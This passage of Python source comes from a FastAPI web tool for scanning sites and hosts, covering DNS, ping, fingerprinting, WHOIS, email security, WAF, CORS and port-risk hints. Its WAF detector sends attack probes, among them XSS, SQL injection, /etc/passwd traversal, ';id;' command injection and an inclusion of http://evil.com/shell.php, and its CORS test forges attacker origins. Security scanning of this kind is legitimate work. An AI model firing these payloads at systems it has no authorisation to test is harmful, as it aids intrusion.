                            stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.DEVNULL)
                        out,_ = await asyncio.wait_for(proc.communicate(),timeout=6)
                        for line in out.decode(errors="replace").strip().splitlines():
                            if line.strip():
                                found += 1
                                await ws.send_json({"type":"result","data":{"record_type":rtype,"value":line.strip(),"status":"FOUND"}})
                    except Exception:
                        pass

        await ws.send_json({"type":"done","message":f"DNS lookup complete — {found} record(s) found"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/ping")
async def ws_ping(ws: WebSocket):
    await ws.accept()
    try:
        data  = await ws.receive_json()
        host  = data.get("host","").strip()
        count = min(int(data.get("count",5)), 20)

        if not host: await ws.send_json({"type":"error","message":"No host specified"}); return

        # Resolve IP first
        loop = asyncio.get_running_loop()
        try:
            infos = await loop.getaddrinfo(host, None, socket.AF_INET)
            ip = infos[0][4][0]
        except Exception:
            ip = host

        PROBE_PORTS = [80, 443, 22, 8080, 8443, 21, 25, 3389]

        await ws.send_json({"type":"info","message":
            f"TCP Ping: {host} ({ip})  |  Count: {count}  |  Probing ports: {', '.join(map(str,PROBE_PORTS[:4]))}..."})

        rtts  = []
        sent  = 0
        recv  = 0

        for seq in range(1, count + 1):
            sent += 1
            best_rtt  = None
            best_port = None

            for port in PROBE_PORTS:
                t0 = time.monotonic()
                try:
                    _, writer = await asyncio.wait_for(
                        asyncio.open_connection(ip, port), timeout=3.0)
                    rtt = round((time.monotonic() - t0) * 1000, 2)
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass
                    if best_rtt is None or rtt < best_rtt:
                        best_rtt  = rtt
                        best_port = port
                except Exception:
                    pass

            if best_rtt is not None:
                recv += 1
                rtts.append(best_rtt)
                await ws.send_json({"type":"result","data":{
                    "seq":seq,"port":best_port,"rtt_ms":best_rtt,"status":"reachable","ip":ip
                }})
            else:
                await ws.send_json({"type":"result","data":{
                    "seq":seq,"port":None,"rtt_ms":None,"status":"unreachable","ip":ip
                }})

            if seq < count:
                await asyncio.sleep(0.5)

        # Stats
        loss = sent - recv
        stats = {
            "host":host,"ip":ip,
            "sent":sent,"received":recv,"lost":loss,
            "loss_pct":round(loss/sent*100) if sent else 0,
            "min_ms":min(rtts) if rtts else None,
            "max_ms":max(rtts) if rtts else None,
            "avg_ms":round(sum(rtts)/len(rtts),2) if rtts else None,
        }
        await ws.send_json({"type":"ping_stats","data":stats})
        await ws.send_json({"type":"done","message":
            f"Ping complete — {recv}/{sent} reachable  avg={stats['avg_ms']}ms"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/techscan")
async def ws_techscan(ws: WebSocket):
    await ws.accept()
    try:
        data = await ws.receive_json()
        url  = data.get("url","").strip()

        if not url: await ws.send_json({"type":"error","message":"No URL specified"}); return
        if not url.startswith(("http://","https://")): url = "https://" + url

        await ws.send_json({"type":"info","message":f"Technology fingerprinting: {url}"})

        found_names: dict = {}
        results = []

        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=15),
                                   allow_redirects=True, ssl=False,
                                   headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}) as r:

                hdrs = {k.lower(): v for k,v in r.headers.items()}
                body = ""
                try:
                    body = (await r.read()).decode("utf-8", errors="replace")[:50000]
                except Exception:
                    pass
                cookies_str = " ".join(c.key + "=" + c.value for c in r.cookies.values())

                await ws.send_json({"type":"info","message":
                    f"HTTP {r.status}  |  {len(body)} bytes  |  {len(hdrs)} headers  |  {len(r.cookies)} cookies"})

                # --- Header analysis ---
                for header_key, sigs in TECH_SIGS_HEADERS.items():
                    hval = hdrs.get(header_key, "")
                    if not hval:
                        # Check prefix match
                        for hk, hv in hdrs.items():
                            if hk.startswith(header_key) and header_key.endswith("-"):
                                hval = hv; break
                    if not hval:
                        continue
                    new_hits = _match_tech(hval, sigs, found_names)
                    for hit in new_hits:
                        hit["evidence"] = f"{header_key}: {hval[:80]}"
                        results.append(hit)
                        await ws.send_json({"type":"result","data":hit})

                # --- Body analysis ---
                body_hits = []
                for pattern, name, category, confidence in TECH_SIGS_BODY:
                    if name in found_names:
                        continue
                    if re.search(pattern, body, re.IGNORECASE):
                        found_names[name] = True
                        m = re.search(pattern, body, re.IGNORECASE)
                        snippet = body[max(0,m.start()-20):m.end()+20].strip()[:80] if m else ""
                        hit = {"name":name,"category":category,"confidence":confidence,"evidence":snippet}
                        results.append(hit)
                        body_hits.append(hit)
                        await ws.send_json({"type":"result","data":hit})

                # --- Cookie analysis ---
                for pattern, name, category, confidence in TECH_SIGS_COOKIES:
                    if name in found_names:
                        continue
                    if re.search(pattern, cookies_str, re.IGNORECASE):
                        found_names[name] = True
                        hit = {"name":name,"category":category,"confidence":confidence,
                               "evidence":f"cookie: {cookies_str[:60]}"}
                        results.append(hit)
                        await ws.send_json({"type":"result","data":hit})

                # --- Robots.txt probe ---
                try:
                    base = str(r.url).rstrip("/")
                    async with session.get(f"{base}/robots.txt", timeout=aiohttp.ClientTimeout(total=5),
                                           ssl=False, allow_redirects=False) as rb:
                        if rb.status == 200:
                            rbody = (await rb.read()).decode(errors="replace")[:2000]
                            for pattern, name, category, confidence in TECH_SIGS_BODY[:10]:
                                if name not in found_names and re.search(pattern, rbody, re.IGNORECASE):
                                    found_names[name] = True
                                    hit = {"name":name,"category":category,"confidence":"MEDIUM",
                                           "evidence":"robots.txt"}
                                    results.append(hit)
                                    await ws.send_json({"type":"result","data":hit})
                except Exception:
                    pass

        await ws.send_json({"type":"done","message":
            f"Tech fingerprint complete — {len(results)} technolog{'ies' if len(results)!=1 else 'y'} detected"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/whois")
async def ws_whois(ws: WebSocket):
    await ws.accept()
    try:
        data   = await ws.receive_json()
        target = re.sub(r"^https?://","",data.get("target","").strip()).split("/")[0].strip()

        if not target: await ws.send_json({"type":"error","message":"No target specified"}); return

        await ws.send_json({"type":"info","message":f"WHOIS lookup: {target}"})

        loop = asyncio.get_running_loop()

        # Determine if IP or domain
        is_ip = bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target))
        ip_to_lookup = target

        if not is_ip:
            # Resolve domain to IP
            try:
                infos = await loop.getaddrinfo(target, None, socket.AF_INET)
                ip_to_lookup = infos[0][4][0]
                await ws.send_json({"type":"result","data":{"field":"Resolved IP","value":ip_to_lookup,"category":"DNS"}})
            except Exception:
                pass

        # IP Geolocation via ip-api.com (free, no key needed)
        try:
            conn = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=conn) as session:
                async with session.get(
                    f"http://ip-api.com/json/{ip_to_lookup}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,query",
                    timeout=aiohttp.ClientTimeout(total=8), ssl=False) as r:
                    if r.status == 200:
                        geo = await r.json(content_type=None)
                        if geo.get("status") == "success":
                            fields = [
                                ("IP Address",   geo.get("query",""),                    "Network"),
                                ("ISP",          geo.get("isp",""),                      "Network"),
                                ("Organization", geo.get("org",""),                      "Network"),
                                ("ASN",          f"{geo.get('as','')} ({geo.get('asname','')})", "Network"),
                                ("Reverse DNS",  geo.get("reverse","(none)"),            "DNS"),
                                ("Country",      f"{geo.get('country','')} ({geo.get('countryCode','')})", "Location"),
                                ("Region",       geo.get("regionName",""),               "Location"),
                                ("City",         geo.get("city",""),                     "Location"),
                                ("Postal Code",  geo.get("zip",""),                      "Location"),
                                ("Timezone",     geo.get("timezone",""),                 "Location"),
                                ("Coordinates",  f"{geo.get('lat','')}, {geo.get('lon','')}","Location"),
                            ]
                            for field, value, category in fields:
                                if value and value != "()":
                                    await ws.send_json({"type":"result","data":{
                                        "field":field,"value":str(value),"category":category}})
                        else:
                            await ws.send_json({"type":"warn","message":f"Geo lookup: {geo.get('message','failed')}"})
        except Exception as e:
            await ws.send_json({"type":"warn","message":f"Geolocation failed: {e}"})

        # WHOIS via port 43
        await ws.send_json({"type":"info","message":"Querying WHOIS servers..."})
        try:
            # First query IANA to find the right whois server
            iana_resp = await whois_raw(target, "whois.iana.org")
            ref_server = None
            for line in iana_resp.splitlines():
                if line.lower().startswith("refer:"):
                    ref_server = line.split(":",1)[1].strip()
                    break
                if line.lower().startswith("whois:"):
                    ref_server = line.split(":",1)[1].strip()
                    break

            whois_text = iana_resp
            if ref_server and ref_server != "whois.iana.org":
                await ws.send_json({"type":"info","message":f"Querying {ref_server}..."})
                whois_text = await whois_raw(target, ref_server)

            # Parse key fields from whois
            WHOIS_FIELDS = [
                ("Domain Name",       r"domain(?:\s+name)?:\s*(.+)",                        "Domain"),
                ("Registrar",         r"registrar:\s*(.+)",                                  "Domain"),
                ("Registrant Org",    r"registrant\s+org(?:anization)?:\s*(.+)",             "Registrant"),
                ("Registrant Country",r"registrant\s+country:\s*(.+)",                       "Registrant"),
                ("Created",           r"(?:creation|created|registered)\s+date:\s*(.+)",     "Dates"),
                ("Updated",           r"(?:updated?|last.modified)\s+date:\s*(.+)",          "Dates"),
                ("Expires",           r"(?:expir(?:y|ation|es|ed))\s+date:\s*(.+)",          "Dates"),
                ("Name Servers",      r"name\s+server:\s*(.+)",                              "DNS"),
                ("Status",            r"domain\s+status:\s*(.+)",                            "Domain"),
                ("DNSSEC",            r"dnssec:\s*(.+)",                                     "Security"),
                ("NetRange",          r"netrange:\s*(.+)",                                   "Network"),
                ("CIDR",              r"cidr:\s*(.+)",                                       "Network"),
                ("NetName",           r"netname:\s*(.+)",                                    "Network"),
                ("Country",           r"^country:\s*(.+)",                                   "Network"),
            ]
            seen_fields = {}
            for field, pattern, category in WHOIS_FIELDS:
                if field in seen_fields:
                    continue
                m = re.search(pattern, whois_text, re.IGNORECASE | re.MULTILINE)
                if m:
                    val = m.group(1).strip()[:200]
                    if val:
                        seen_fields[field] = True
                        await ws.send_json({"type":"result","data":{
                            "field":field,"value":val,"category":category}})

            # Send raw whois (first 2000 chars)
            preview = whois_text[:2000].strip()
            if preview:
                await ws.send_json({"type":"whois_raw","text":preview})

        except Exception as e:
            await ws.send_json({"type":"warn","message":f"WHOIS query failed: {e}"})

        await ws.send_json({"type":"done","message":f"WHOIS lookup complete for {target}"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/emailsec")
async def ws_emailsec(ws: WebSocket):
    await ws.accept()
    try:
        data   = await ws.receive_json()
        domain = re.sub(r"^https?://","",data.get("domain","").strip()).split("/")[0].lstrip("www.")

        if not domain: await ws.send_json({"type":"error","message":"No domain specified"}); return

        await ws.send_json({"type":"info","message":f"Email security audit: {domain}"})

        found = 0

        # Try dnspython or DoH fallback
        try:
            import dns.resolver as resolver
            HAS_DNS = True
        except ImportError:
            HAS_DNS = False

        async def query_txt(name):
            if HAS_DNS:
                try:
                    answers = resolver.resolve(name,"TXT",raise_on_no_answer=False)
                    if answers.rrset:
                        return [" ".join(s.decode(errors="replace") for s in r.strings) for r in answers]
                except Exception:
                    pass
                return []
            else:
                try:
                    conn = aiohttp.TCPConnector(ssl=False)
                    async with aiohttp.ClientSession(connector=conn) as session:
                        return await dns_query_doh(name,"TXT",session)
                except Exception:
                    return []

        async def query_mx(name):
            if HAS_DNS:
                try:
                    answers = resolver.resolve(name,"MX",raise_on_no_answer=False)
                    if answers.rrset:
                        return [(r.preference, str(r.exchange)) for r in sorted(answers, key=lambda x: x.preference)]
                except Exception:
                    pass
                return []
            else:
                try:
                    conn = aiohttp.TCPConnector(ssl=False)
                    async with aiohttp.ClientSession(connector=conn) as session:
                        vals = await dns_query_doh(name,"MX",session)
                        result = []
                        for v in vals:
                            parts = v.split()
                            if len(parts) >= 2:
                                result.append((int(parts[0]), parts[1]))
                        return result
                except Exception:
                    return []

        # ── MX Records ───────────────────────────────────────────────────────
        await ws.send_json({"type":"info","message":"Checking MX records..."})
        mx_records = await query_mx(domain)
        if mx_records:
            for pref, exch in mx_records[:5]:
                found += 1
                await ws.send_json({"type":"result","data":{
                    "check":"MX Record","value":f"Priority {pref}: {exch}",
                    "status":"FOUND","severity":"INFO"}})
        else:
            await ws.send_json({"type":"result","data":{
                "check":"MX Record","value":"No MX records found — domain may not accept email",
                "status":"WARN","severity":"MEDIUM"}})

        # ── SPF ──────────────────────────────────────────────────────────────
        await ws.send_json({"type":"info","message":"Checking SPF record..."})
        txts = await query_txt(domain)
        spf_records = [t for t in txts if t.strip().startswith("v=spf1")]

        if len(spf_records) == 0:
            await ws.send_json({"type":"result","data":{
                "check":"SPF","value":"No SPF record found — email spoofing not prevented",
                "status":"MISSING","severity":"HIGH"}})
        elif len(spf_records) > 1:
            await ws.send_json({"type":"result","data":{
                "check":"SPF","value":f"Multiple SPF records ({len(spf_records)}) — invalid configuration, first wins only",
                "status":"WARN","severity":"HIGH"}})
        else:
            spf = spf_records[0]
            found += 1
            await ws.send_json({"type":"result","data":{
                "check":"SPF","value":spf[:200],"status":"FOUND","severity":"INFO"}})
            # Analyze SPF
            if "+all" in spf:
                await ws.send_json({"type":"result","data":{
                    "check":"SPF Policy","value":"+all allows ALL senders — CRITICAL misconfiguration",
                    "status":"CRITICAL","severity":"CRITICAL"}})
            elif "?all" in spf:
                await ws.send_json({"type":"result","data":{
                    "check":"SPF Policy","value":"?all is neutral — provides no protection",
                    "status":"WARN","severity":"MEDIUM"}})
            elif "~all" in spf:
                await ws.send_json({"type":"result","data":{
                    "check":"SPF Policy","value":"~all (softfail) — email from unlisted IPs flagged but not rejected",
                    "status":"WARN","severity":"LOW"}})
            elif "-all" in spf:
                await ws.send_json({"type":"result","data":{
                    "check":"SPF Policy","value":"-all (hardfail) — strict policy, unlisted senders rejected",
                    "status":"OK","severity":"INFO"}})

        # ── DMARC ────────────────────────────────────────────────────────────
        await ws.send_json({"type":"info","message":"Checking DMARC record..."})
        dmarc_txts = await query_txt(f"_dmarc.{domain}")
        dmarc_records = [t for t in dmarc_txts if "v=DMARC1" in t]

        if not dmarc_records:
            await ws.send_json({"type":"result","data":{
                "check":"DMARC","value":"No DMARC record found — email authentication not enforced",
                "status":"MISSING","severity":"HIGH"}})
        else:
            dmarc = dmarc_records[0]
            found += 1
            await ws.send_json({"type":"result","data":{
                "check":"DMARC","value":dmarc[:200],"status":"FOUND","severity":"INFO"}})
            # Analyze policy
            p_match = re.search(r"\bp=(\w+)", dmarc)
            if p_match:
                policy = p_match.group(1).lower()
                if policy == "none":
                    await ws.send_json({"type":"result","data":{
                        "check":"DMARC Policy","value":"p=none — monitoring only, no enforcement",
                        "status":"WARN","severity":"MEDIUM"}})
                elif policy == "quarantine":
                    await ws.send_json({"type":"result","data":{
                        "check":"DMARC Policy","value":"p=quarantine — suspicious emails go to spam",
                        "status":"WARN","severity":"LOW"}})
                elif policy == "reject":
                    await ws.send_json({"type":"result","data":{
                        "check":"DMARC Policy","value":"p=reject — spoofed emails rejected outright (best practice)",
                        "status":"OK","severity":"INFO"}})
            # Check reporting
            if "rua=" not in dmarc:
                await ws.send_json({"type":"result","data":{
                    "check":"DMARC Reports","value":"No aggregate report address (rua=) — no visibility into spoofing attempts",
                    "status":"WARN","severity":"LOW"}})
            else:
                rua = re.search(r"rua=([^;]+)", dmarc)
                if rua:
                    await ws.send_json({"type":"result","data":{
                        "check":"DMARC Reports","value":f"Aggregate reports sent to: {rua.group(1)}",
                        "status":"OK","severity":"INFO"}})

        # ── DKIM ─────────────────────────────────────────────────────────────
        await ws.send_json({"type":"info","message":"Probing common DKIM selectors..."})
        DKIM_SELECTORS = ["default","google","mail","k1","s1","s2","dkim","selector1","selector2",
                          "protonmail","smtp","email","key1","key2","20230601","2024","2023"]
        dkim_found = 0
        for sel in DKIM_SELECTORS:
            dkim_name = f"{sel}._domainkey.{domain}"
            dkim_txts = await query_txt(dkim_name)
            dkim_rec  = [t for t in dkim_txts if "v=DKIM1" in t or "p=" in t]
            if dkim_rec:
                dkim_found += 1
                found += 1
                await ws.send_json({"type":"result","data":{
                    "check":"DKIM","value":f"Selector '{sel}' found: {dkim_rec[0][:100]}",
                    "status":"FOUND","severity":"INFO"}})
                if dkim_found >= 3:
                    break
        if dkim_found == 0:
            await ws.send_json({"type":"result","data":{
                "check":"DKIM","value":"No DKIM records found for common selectors",
                "status":"MISSING","severity":"MEDIUM"}})

        # ── BIMI ─────────────────────────────────────────────────────────────
        bimi_txts = await query_txt(f"default._bimi.{domain}")
        if bimi_txts and any("v=BIMI1" in t for t in bimi_txts):
            await ws.send_json({"type":"result","data":{
                "check":"BIMI","value":"BIMI record found — brand logo in email clients supported",
                "status":"FOUND","severity":"INFO"}})

        # ── MTA-STS ──────────────────────────────────────────────────────────
        mtasts_txts = await query_txt(f"_mta-sts.{domain}")
        if mtasts_txts:
            await ws.send_json({"type":"result","data":{
                "check":"MTA-STS","value":mtasts_txts[0][:100],"status":"FOUND","severity":"INFO"}})
        else:
            await ws.send_json({"type":"result","data":{
                "check":"MTA-STS","value":"No MTA-STS record — TLS not enforced for inbound SMTP",
                "status":"MISSING","severity":"LOW"}})

        # ── TLS-RPT ──────────────────────────────────────────────────────────
        tlsrpt_txts = await query_txt(f"_smtp._tls.{domain}")
        if tlsrpt_txts:
            await ws.send_json({"type":"result","data":{
                "check":"TLS-RPT","value":tlsrpt_txts[0][:100],"status":"FOUND","severity":"INFO"}})

        await ws.send_json({"type":"done","message":f"Email security audit complete — {found} record(s) found"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/wafdetect")
async def ws_wafdetect(ws: WebSocket):
    await ws.accept()
    try:
        data = await ws.receive_json()
        url  = data.get("url","").strip()

        if not url: await ws.send_json({"type":"error","message":"No URL specified"}); return
        if not url.startswith(("http://","https://")): url = "https://" + url

        await ws.send_json({"type":"info","message":f"WAF/CDN detection: {url}"})

        detected: dict = {}

        def _add(name, vendor, confidence, method):
            key = f"{vendor}:{name}"
            if key not in detected:
                detected[key] = True
                return {"name":name,"vendor":vendor,"confidence":confidence,"method":method}
            return None

        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:

            # ── Step 1: Normal request ────────────────────────────────────
            async def check_response(resp_hdrs, body_text, cookies, label="normal"):
                hits = []
                hdrs_lower = {k.lower():v for k,v in resp_hdrs.items()}

                for sig in WAF_SIGS:
                    hit = None
                    if sig["type"] == "header_key":
                        if sig["header"] in hdrs_lower:
                            hit = _add(sig["name"], sig["vendor"], sig["confidence"], f"header '{sig['header']}'")
                    elif sig["type"] == "server_val":
                        sv = hdrs_lower.get("server","")
                        if sv and re.search(sig["pattern"], sv, re.IGNORECASE):
                            hit = _add(sig["name"], sig["vendor"], sig["confidence"], f"Server: {sv[:50]}")
                    elif sig["type"] == "xpb_val":
                        xp = hdrs_lower.get("x-powered-by","")
                        if xp and re.search(sig["pattern"], xp, re.IGNORECASE):
                            hit = _add(sig["name"], sig["vendor"], sig["confidence"], f"X-Powered-By: {xp[:50]}")
                    elif sig["type"] == "cookie":
                        for ck in cookies:
                            if sig["cookie"].lower() in ck.lower():
                                hit = _add(sig["name"], sig["vendor"], sig["confidence"], f"cookie: {ck[:40]}")
                                break
                    elif sig["type"] == "body_pattern":
                        if body_text and re.search(sig["pattern"], body_text, re.IGNORECASE):
                            hit = _add(sig["name"], sig["vendor"], sig["confidence"], f"response body [{label}]")

                    if hit:
                        hits.append(hit)
                        await ws.send_json({"type":"result","data":hit})
                return hits

            # Normal request
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10),
                                       allow_redirects=True, ssl=False,
                                       headers={"User-Agent":"Mozilla/5.0 ScanX/3.0"}) as r:
                    body = (await r.read()).decode(errors="replace")[:5000]
                    cookie_names = list(r.cookies.keys())
                    await ws.send_json({"type":"info","message":f"Normal request: HTTP {r.status}"})
                    await check_response(dict(r.headers), body, cookie_names, "normal")
            except Exception as e:
                await ws.send_json({"type":"warn","message":f"Normal request failed: {e}"})

            # ── Step 2: Malicious payload probes ─────────────────────────
            await ws.send_json({"type":"info","message":"Sending WAF probe payloads..."})
            payloads = [
                ("XSS probe",  f"{url}?q=<script>alert(1)</script>"),
                ("SQLi probe", f"{url}?id=1'%20OR%20'1'='1"),
                ("Path probe", f"{url}/../../../etc/passwd"),
                ("RFI probe",  f"{url}?file=http://evil.com/shell.php"),
                ("Cmd probe",  f"{url}?cmd=;id;"),
            ]
            for label, probe_url in payloads:
                try:
                    async with session.get(probe_url, timeout=aiohttp.ClientTimeout(total=8),
                                           allow_redirects=False, ssl=False,
                                           headers={"User-Agent":"ScanX/3.0 WAF-Probe"}) as r:
                        body = (await r.read()).decode(errors="replace")[:3000]
                        cookie_names = list(r.cookies.keys())
                        status_note = ""
                        if r.status in (403,406,429,501,503):
                            status_note = f"HTTP {r.status} — possible WAF block"
                            waf_block = _add(f"WAF Blocking ({r.status})", "Unknown WAF",
                                             "MEDIUM", f"{label} → {r.status}")
                            if waf_block:
                                waf_block["blocked_by"] = label
                                await ws.send_json({"type":"result","data":waf_block})
                        await ws.send_json({"type":"info","message":
                            f"{label}: HTTP {r.status} {status_note}".strip()})
                        await check_response(dict(r.headers), body, cookie_names, label)
                except Exception:
                    pass

        if not detected:
            await ws.send_json({"type":"result","data":{
                "name":"No WAF/CDN detected","vendor":"N/A",
                "confidence":"LOW","method":"No known signatures matched"}})
            await ws.send_json({"type":"info","message":
                "No WAF signatures detected — site may be unprotected or using an unknown WAF"})

        await ws.send_json({"type":"done","message":
            f"WAF detection complete — {len(detected)} component(s) identified"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/corsscan")
async def ws_corsscan(ws: WebSocket):
    await ws.accept()
    try:
        data = await ws.receive_json()
        url  = data.get("url","").strip()

        if not url: await ws.send_json({"type":"error","message":"No URL specified"}); return
        if not url.startswith(("http://","https://")): url = "https://" + url

        # Extract base domain for subdomain tests
        from urllib.parse import urlparse
        parsed = urlparse(url)
        base_domain = parsed.hostname or ""

        await ws.send_json({"type":"info","message":f"CORS misconfiguration scan: {url}"})

        TEST_ORIGINS = [
            ("Wildcard check",               "https://evil.com"),
            ("Attacker domain",              "https://attacker.example.com"),
            ("Null origin",                  "null"),
            ("HTTP downgrade",               f"http://{base_domain}"),
            ("Subdomain injection",          f"https://evil.{base_domain}"),
            ("Trusted suffix bypass",        f"https://evil{base_domain}"),
            ("Trusted prefix bypass",        f"https://{base_domain}.evil.com"),
            ("localhost bypass",             "http://localhost"),
            ("127.0.0.1 bypass",             "http://127.0.0.1"),
        ]

        vulns_found = 0
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            for test_name, origin in TEST_ORIGINS:
                try:
                    async with session.options(
                        url, timeout=aiohttp.ClientTimeout(total=8),
                        allow_redirects=False, ssl=False,
                        headers={
                            "Origin":                 origin,
                            "Access-Control-Request-Method":"GET",
                            "Access-Control-Request-Headers":"Content-Type,Authorization",
                            "User-Agent":             "ScanX/3.0 CORS-Scanner",
                        }) as r:
                        acao = r.headers.get("Access-Control-Allow-Origin","(not set)")
                        acac = r.headers.get("Access-Control-Allow-Credentials","false")
                        acam = r.headers.get("Access-Control-Allow-Methods","(not set)")
                        acah = r.headers.get("Access-Control-Allow-Headers","(not set)")

                        is_vuln   = False
                        severity  = "INFO"
                        vuln_desc = ""

                        if acao == "*" and acac.lower() == "true":
                            is_vuln   = True
                            severity  = "CRITICAL"
                            vuln_desc = "ACAO:* with ACAC:true — browsers block this, but non-browser clients may exploit"
                        elif acao == origin and origin != "(not set)":
                            is_vuln   = True
                            severity  = "HIGH" if "evil" in origin.lower() or origin == "null" else "MEDIUM"
                            vuln_desc = f"Origin reflected → possible CORS bypass"
                            if acac.lower() == "true":
                                severity  = "CRITICAL"
                                vuln_desc += " with credentials allowed"
                        elif acao == "*":
                            severity  = "LOW"
                            vuln_desc = "Wildcard ACAO — acceptable for public APIs, not for credentialed requests"

                        status = "VULN" if is_vuln else ("WARN" if severity not in ("INFO","LOW") else "OK")
                        if is_vuln:
                            vulns_found += 1

                        await ws.send_json({"type":"result","data":{
                            "test":       test_name,
                            "origin":     origin,
                            "acao":       acao,
                            "acac":       acac,
                            "methods":    acam,
                            "status":     status,
                            "severity":   severity,
                            "desc":       vuln_desc or f"ACAO: {acao}",
                        }})
                except Exception as e:
                    await ws.send_json({"type":"result","data":{
                        "test":test_name,"origin":origin,"acao":"(error)","acac":"","methods":"",
                        "status":"ERROR","severity":"INFO","desc":str(e)[:60]}})

            # Also check GET with Origin header
            for test_name, origin in [("GET reflect check","https://evil.com"),
                                       ("GET null origin","null")]:
                try:
                    async with session.get(
                        url, timeout=aiohttp.ClientTimeout(total=8),
                        allow_redirects=False, ssl=False,
                        headers={"Origin":origin,"User-Agent":"ScanX/3.0"}) as r:
                        acao = r.headers.get("Access-Control-Allow-Origin","(not set)")
                        acac = r.headers.get("Access-Control-Allow-Credentials","false")
                        is_vuln = acao == origin
                        severity = "HIGH" if is_vuln and acac.lower()=="true" else ("MEDIUM" if is_vuln else "INFO")
                        if is_vuln:
                            vulns_found += 1
                        await ws.send_json({"type":"result","data":{
                            "test":f"GET/{test_name}","origin":origin,"acao":acao,"acac":acac,
                            "methods":"GET","status":"VULN" if is_vuln else "OK",
                            "severity":severity,"desc":"Origin reflected in GET response" if is_vuln else "OK"}})
                except Exception:
                    pass

        msg = f"CORS scan complete — {vulns_found} misconfiguration(s) found"
        if vulns_found == 0:
            msg += " — no obvious CORS misconfigurations detected"
        await ws.send_json({"type":"done","message":msg})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/vulnscan")
async def ws_vulnscan(ws: WebSocket):
    await ws.accept()
    try:
        data    = await ws.receive_json()
        host    = data.get("host","").strip()
        ports_s = data.get("ports","").strip()  # comma-separated open ports

        if not host: await ws.send_json({"type":"error","message":"No host specified"}); return

        await ws.send_json({"type":"info","message":f"Vulnerability hint scan: {host}"})
        await ws.send_json({"type":"warn","message":
            "NOTE: This provides advisory hints based on exposed services — not a full CVE scanner. Always verify with dedicated tools."})

        # Parse port list
        open_ports = []
        if ports_s:
            try:
                open_ports = [int(p.strip()) for p in ports_s.split(",") if p.strip().isdigit()]
            except Exception:
                pass

        # If no ports provided, do a quick scan of known dangerous ports
        if not open_ports:
            await ws.send_json({"type":"info","message":"No ports provided — scanning common high-risk ports..."})
            RISKY_PORTS = [21,22,23,25,80,139,443,445,1433,1521,2375,3306,3389,5432,5900,5984,
                           6379,7001,8080,8443,8888,9200,11211,27017,28017]
            sem = asyncio.Semaphore(100)
            tasks = [scan_port_tcp(host,p,sem,1.0,False) for p in RISKY_PORTS]
            for coro in asyncio.as_completed(tasks):
                res = await coro
                if res["status"] == "open":
                    open_ports.append(res["port"])
                    await ws.send_json({"type":"info","message":f"Open: {res['port']}/{res['service']}"})

        if not open_ports:
            await ws.send_json({"type":"info","message":"No open high-risk ports found"})
            await ws.send_json({"type":"done","message":"Vulnerability scan complete — no open risk ports detected"}); return

        total_hints = 0
        for port in sorted(open_ports):
            service = PORT_SERVICES.get(port, "Unknown")
            hints   = VULN_HINTS.get(service, [])

            # Generic checks for dangerous ports
            if port == 2375: hints = VULN_HINTS.get("Docker", []) + hints
            if port == 6379: hints = VULN_HINTS.get("Redis", []) + hints
            if port == 9200: hints = VULN_HINTS.get("Elasticsearch", []) + hints
            if port == 5984: hints = VULN_HINTS.get("CouchDB", []) + hints
            if port == 11211:hints = VULN_HINTS.get("Memcached", []) + hints
            if port == 8888: hints = VULN_HINTS.get("Jupyter", []) + hints
            if port == 27017:hints = VULN_HINTS.get("MongoDB", []) + hints
            if port == 5900: hints = VULN_HINTS.get("VNC", []) + hints

            if hints:
                await ws.send_json({"type":"info","message":
                    f"Port {port}/{service} — {len(hints)} vulnerability hint(s):"})
                for h in hints:
                    total_hints += 1
                    sev = h["severity"]
                    bc  = "CRITICAL" if sev=="CRITICAL" else ("HIGH" if sev=="HIGH" else ("MEDIUM" if sev=="MEDIUM" else "LOW"))
                    await ws.send_json({"type":"result","data":{
                        "port":port,"service":service,
                        "id":h["id"],"title":h["title"],
                        "severity":sev,"desc":h["desc"].replace("{host}",host),
                        "status":bc,
                    }})
            else:
                await ws.send_json({"type":"info","message":
                    f"Port {port}/{service} — no specific hints (check manually)"})

        await ws.send_json({"type":"done","message":
            f"Vulnerability hint scan complete — {total_hints} hint(s) across {len(open_ports)} port(s)"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/traceroute")
async def ws_traceroute(ws: WebSocket):
    await ws.accept()
    try:
        data     = await ws.receive_json()
        host     = data.get("host","").strip()
        max_hops = min(int(data.get("max_hops",20)), 30)

        if not host: await ws.send_json({"type":"error","message":"No host specified"}); return

        await ws.send_json({"type":"info","message":f"Traceroute to: {host}  |  Max hops: {max_hops}"})
        await ws.send_json({"type":"warn","message":
            "Note: TCP-based traceroute — may not show all hops through firewalls. ICMP results may vary by OS/permissions."})

        system = platform.system().lower()
        loop   = asyncio.get_running_loop()

        # Determine best available traceroute command
        cmd = None
        if system == "windows":
            if shutil.which("tracert"):
                cmd = ["tracert","-d","-h",str(max_hops),host]
        else:
